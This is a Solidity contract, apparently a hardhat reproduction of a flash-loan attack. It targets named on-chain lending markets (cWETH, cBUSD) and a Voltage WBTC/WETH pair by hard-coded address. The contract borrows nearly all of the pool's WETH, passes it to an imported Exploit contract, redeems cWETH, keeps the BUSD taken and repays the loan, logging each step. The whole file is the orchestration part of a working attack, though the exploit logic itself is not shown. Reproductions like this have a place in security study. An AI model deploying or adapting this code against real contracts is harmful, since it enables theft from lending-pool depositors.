pragma solidity ^0.5.16;

import "./WETH9.sol";
import "./CErc20.sol";
import "./Exploit.sol";
import "./ERC677BridgeToken.sol";
import "./uniswap/IUniswapV2Pair.sol";
import "./interfaces/IVoltageRouter.sol";
import "./Comptroller.sol";

import "hardhat/console.sol";

contract Launcher {
	IVoltageRouter public constant router = IVoltageRouter(0xE3F85aAd0c8DD7337427B9dF5d0fB741d65EEEB5);
	IUniswapV2Pair public constant WBTCWETH = IUniswapV2Pair(0x97F4F45F0172F2E20Ab284A61C8adcf5E4d04228);

	WETH9 public WFUSE = WETH9(0x0BE9e53fd7EDaC9F859882AfdDa116645287C629);

	ERC677BridgeToken public WETH; 
	ERC677BridgeToken public BUSD;
	Comptroller public troll; 
	CErc20 public constant cWETH = CErc20(0x139Eb08579eec664d461f0B754c1F8B569044611);
	CErc20 public constant cBUSD = CErc20(0xBaAFD1F5e3846C67465FCbb536a52D5d8f484Abc);	

	Exploit public exploit;

	uint256 private borrowedWETHAmount;

	constructor() public {
		WETH = ERC677BridgeToken(cWETH.underlying());
		BUSD = ERC677BridgeToken(cBUSD.underlying());
		troll = Comptroller(address(cWETH.comptroller()));
	}

	function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        console.log("[Launcher]     Loan WETH: %s\n", borrowedWETHAmount);
        WETH.transfer(address(exploit), borrowedWETHAmount);

        exploit.main();

        console.log("\n[Launcher] (3) Run Exploit contract");
		uint256 _cWETHAmount = cWETH.balanceOf(address(this));
        console.log("[Launcher]     cWETH: %s", _cWETHAmount);
		uint256 _BUSDAmount = BUSD.balanceOf(address(this));
        console.log("[Launcher]     BUSD: %s", _BUSDAmount);

        console.log("[Launcher] (4) Redeem cWETH");
        cWETH.redeem(_cWETHAmount);
        console.log("[Launcher]     Total WETH: %s", WETH.balanceOf(address(this)));

        console.log("[Launcher] (5) Pay flash loan");
        uint256 _WETHAmountIn = borrowedWETHAmount * 1000 / 997 + 1; 
        require(_WETHAmountIn <= WETH.balanceOf(address(this)), "not enough WETH");
        console.log("[Launcher]     Return WETH: %s", _WETHAmountIn);
        WETH.transfer(address(WBTCWETH), _WETHAmountIn);
	}

	function flashLoan() internal {
		// token 0: WBTC | token 1: WETH
        (uint256 _reserve0, uint256 _reserve1, ) = WBTCWETH.getReserves();
        borrowedWETHAmount = _reserve1 - 1;
        console.log("[Launcher] (2) Flashloan WETH from Voltage pool");
        WBTCWETH.swap(0, borrowedWETHAmount, address(this), abi.encode(uint8(0x1)));
	}

	function prepare() payable external {	
        console.log("[Launcher] (0) Swap a few WFUSE for WETH");
        address[] memory _path = new address[](2);
        _path[0] = address(WFUSE);
        _path[1] = address(WETH);
        router.swapExactETHForTokens.value(msg.value)(
        	0, 
        	_path, 
        	address(this), 
        	block.timestamp + 100
        );

        uint256 _startWETHAmount = WETH.balanceOf(address(this));
        console.log("[Launcher]     Start WETH: %s", _startWETHAmount);
	}

	function main() public {	
        console.log("[Launcher] (1) Deploy Exploit contract");
		exploit = new Exploit(
			address(this),
			WETH,
			BUSD,
			troll,
			cWETH,
			cBUSD
		);

		flashLoan();

		console.log("[Launcher] (6) End");		
        console.log("[Launcher]     BUSD: %s", BUSD.balanceOf(address(this)));
	}	
}